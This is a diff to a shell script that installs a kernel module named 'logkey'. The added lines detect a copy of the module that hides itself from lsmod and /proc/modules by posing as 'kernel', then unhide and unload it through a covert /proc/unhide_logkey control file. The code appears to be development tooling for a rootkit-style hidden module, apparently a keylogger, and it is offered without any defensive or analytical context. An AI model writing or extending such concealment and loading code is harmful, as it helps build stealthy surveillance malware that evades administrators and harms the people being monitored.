@@ -47,6 +47,17 @@ print_status "Kernel module built successfully"
 if lsmod | grep -q "logkey"; then
     print_warning "Module already loaded, unloading..."
     rmmod logkey 2>/dev/null || true
+elif cat /proc/modules | grep -q "kernel.*20480"; then
+    print_warning "Hidden module found, unhiding and unloading..."
+    if [ -f "/proc/unhide_logkey" ]; then
+        echo "unhide" > /proc/unhide_logkey
+        sleep 1
+        rmmod logkey 2>/dev/null || true
+    else
+        print_error "Cannot unhide module - /proc/unhide_logkey not found"
+        print_error "You may need to reboot to remove the hidden module"
+        exit 1
+    fi
 fi
 
 # Load the module
